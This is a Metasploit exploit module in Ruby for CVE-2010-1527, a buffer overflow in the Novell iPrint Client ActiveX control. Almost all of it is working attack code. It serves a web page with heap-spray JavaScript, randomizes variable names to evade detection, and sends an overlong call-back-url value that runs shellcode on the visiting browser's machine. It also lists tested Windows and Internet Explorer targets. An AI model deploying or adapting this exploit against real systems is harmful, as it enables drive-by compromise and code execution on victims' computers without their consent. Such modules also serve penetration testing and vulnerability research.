##
# novelliprint_callbackurl.rb
#
# Novell iPrint Client ActiveX Control call-back-url Buffer Overflow exploit for the Metasploit Framework
#
# Exploit successfully tested on the following platforms:
#  - Novell iPrint Client 5.40 on Internet Explorer 7, Windows XP SP3
#  - Novell iPrint Client 5.42 on Internet Explorer 7, Windows XP SP3
#  - Novell iPrint Client 5.42 on Internet Explorer 7, Windows Vista SP2
#
# ienipp.ocx version tested:
# File Version: 5.4.0.0 and 5.4.2.0
# ClassID: 36723F97-7AA0-11D4-8919-FF2D71D0D32C
# RegKey Safe for Script: True
# RegKey Safe for Init: True
# KillBitSet: False
#
# References:
#  - CVE-2010-1527
#  - OSVDB 67411
#  - http://secunia.com/secunia_research/2010-104/ - Original advisory by Carsten Eiram, Secunia Research
#  - http://www.exploit-db.com/exploits/15042/ - MOAUB #19 exploit
#  - http://www.exploit-db.com/moaub-19-novell-iprint-client-browser-plugin-call-back-url-stack-overflow/ - MOAUB #14 binary analysis
#  - http://www.rec-sec.com/2010/09/21/novell-iprint-callbackurl-buffer-overflow-exploit/ - Metasploit exploit by Trancer, Recognize-Security
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell iPrint Client ActiveX Control call-back-url Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in Novell iPrint Client 5.42.
					When sending an overly long string to the 'call-back-url' parameter in an 
					op-client-interface-version action of ienipp.ocx an attacker may be able to 
					execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Trancer <mtrancer[at]gmail.com' ],
			'Version'        => '$Revision:$',
			'References'     =>
				[
					[ 'CVE', '2010-1527' ],
					[ 'OSVDB', '67411'],
					[ 'URL', 'http://secunia.com/secunia_research/2010-104/' ],	# Carsten Eiram, Secunia Research
					[ 'URL', 'http://www.exploit-db.com/exploits/15042/' ],		# MOAUB #19
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ]
				],
			'DisclosureDate' => 'Aug 20 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
		ret  	  = [target.ret].pack('V')
		ret 	  = ret * 250
		blocksize = 0x40000
		fillto    = 500 
		offset 	  = target['Offset']
		
		# ActiveX parameters
		clsid 	= "36723F97-7AA0-11D4-8919-FF2D71D0D32C"

		# Randomize the javascript variable names
		ienipp       = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)

		html = %Q|<html> 
<script>
var #{j_shellcode} = unescape('#{shellcode}');
var #{j_nops} = unescape('#{nops}');
var #{j_headersize} = 20;
var #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;
while (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};
var #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace});
var #{j_block} = #{j_nops}.substring(0,#{j_nops}.length - #{j_slackspace});
while (#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};
var #{j_memory} = new Array();
for (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) { 
	#{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};
} 
</script>
<object classid='clsid:#{clsid}' id='#{ienipp}'>
<param name='operation' value='op-client-interface-version' />  
<param name='result-type' value='url' />  
<param name='call-back-url' value='#{ret}' />
</object>
</html>|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)
	end

end